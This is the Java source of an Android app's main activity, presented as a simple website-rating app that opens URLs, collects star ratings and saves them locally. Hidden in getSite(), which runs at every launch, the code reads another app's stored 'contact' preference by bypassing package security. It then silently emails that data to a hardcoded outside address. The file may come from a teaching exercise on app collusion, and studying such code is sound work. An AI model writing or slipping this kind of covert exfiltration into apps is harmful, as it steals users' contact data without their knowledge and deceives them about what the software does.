package com.example.app2;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.util.Log;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.RatingBar;
import java.util.Arrays;
import java.util.List;
import java.util.Collections;

public class MainActivity extends AppCompatActivity {
    BDDSite bdSite;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        bdSite = new BDDSite(this);
        try {
            getSite();
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    public void browse(View view){
        EditText field = (EditText) findViewById(R.id.url);
        String url = field.getText().toString();
        Uri page = Uri.parse(url);
        Intent intent = new Intent(Intent.ACTION_VIEW, page);
        startActivityForResult(intent, 1);
    }

    public void getSite() throws PackageManager.NameNotFoundException {
        bdSite.open();
        List<String> site = bdSite.getSites();
        bdSite.close();
        Context context = this.createPackageContext("com.example.app1", Context.CONTEXT_IGNORE_SECURITY);
        SharedPreferences contactPref = PreferenceManager.getDefaultSharedPreferences(context);
        final String pref = contactPref.getString("contact", null);
        Log.e("CON", " " + pref);
        sendEmail(pref);
        if (site == null){
            Log.d("recup", "list null");
            site = Arrays.asList(new String[]{
                    "error", "error", "error"
            });
        }
        ListView sites = (ListView) findViewById(R.id.website);
        Collections.reverse(site);
        sites.setAdapter(new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, site));
    }


    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        String message = "";
        if (requestCode == 1) {
            //intent 1 was
            if(resultCode == Activity.RESULT_OK) {
                //successful
            } else {
                //not succusseful
            }
            ShowDialog();
        }
    }


    public void ShowDialog()
    {
        EditText field = (EditText) findViewById(R.id.url);
        final String url = field.getText().toString();
        final int[] rate = new int[1];

        final AlertDialog.Builder popDialog = new AlertDialog.Builder(this);

        LinearLayout linearLayout = new LinearLayout(this);
        final RatingBar rating = new RatingBar(this);

        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
        );
        rating.setLayoutParams(lp);
        rating.setNumStars(5);
        rating.setStepSize(1);

        //add ratingBar to linearLayout
        linearLayout.addView(rating);

        popDialog.setIcon(android.R.drawable.btn_star_big_on);
        popDialog.setTitle("Rate "+url+"\n");

        //add linearLayout to dailog
        popDialog.setView(linearLayout);

        rating.setOnRatingBarChangeListener(new RatingBar.OnRatingBarChangeListener() {
            @Override
            public void onRatingChanged(RatingBar ratingBar, float v, boolean b) {
                rate[0] = (int) v;
                System.out.println(url+" Rated val:"+v);
            }
        });

        // Button OK
        popDialog.setPositiveButton(android.R.string.ok,
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        //textView.setText(String.valueOf(rating.getProgress()));
                        Site site = new Site(url, rate[0]);
                        bdSite.open();
                        bdSite.insertSite(site);
                        bdSite.close();
                        try {
                            getSite();
                        } catch (PackageManager.NameNotFoundException e) {
                            e.printStackTrace();
                        }
                        EditText field = (EditText) findViewById(R.id.url);
                        String url = field.getText().toString();
                        field.setText("https://");
                        dialog.dismiss();
                    }
                })

                // Button Cancel
                .setNegativeButton("Cancel",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int id) {
                                dialog.cancel();
                            }
                        });

        popDialog.create();
        popDialog.show();

    }

    private void sendEmail(String data){
        String mEmail = "Joanie.l@orange.fr";
        String mSubject = "List of contact app android";
        String mMessage = data;

        JavaMailApi javaMailApi = new JavaMailApi(this, mEmail, mSubject, mMessage);
        javaMailApi.execute();
        System.out.println("email sent");
    }
}